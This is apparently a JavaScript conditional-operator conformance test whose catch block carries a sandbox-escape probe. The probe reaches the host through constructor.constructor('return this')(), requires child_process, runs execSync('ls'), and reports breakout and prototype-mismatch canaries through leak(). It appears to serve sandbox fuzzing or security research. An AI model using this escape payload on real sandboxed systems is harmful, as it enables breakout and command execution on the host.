try {
    if ((true ? false : true) !== false) {
        $ERROR('#1: (true ? false : true) === false');
    }
    if ((false ? false : true) !== true) {
        $ERROR('#2: (false ? false : true) === true');
    }
    var x = new Boolean(true);
    var y = new Boolean(false);
    if ((x ? y : true) !== y) {
        $ERROR('#3: var x = new Boolean(true); var y = new Boolean(false); (x ? y : true) === y');
    }
    var z = new Boolean(true);
    if ((false ? false : z) !== z) {
        $ERROR('#4: var z = new Boolean(true); (false ? false : z) === z');
    }
    var x = new Boolean(true);
    var y = new Boolean(false);
    var z = new Boolean(true);
    if ((x ? y : z) !== y) {
        $ERROR('#5: var x = new Boolean(true); var y = new Boolean(false); var z = new Boolean(true); (x ? y : z) === y');
    }
    var x = false;
    var y = new Boolean(false);
    var z = new Boolean(true);
    if ((x ? y : z) !== z) {
        $ERROR('#6: var x = false; var y = new Boolean(false); var z = new Boolean(true); (x ? y : z) === z');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}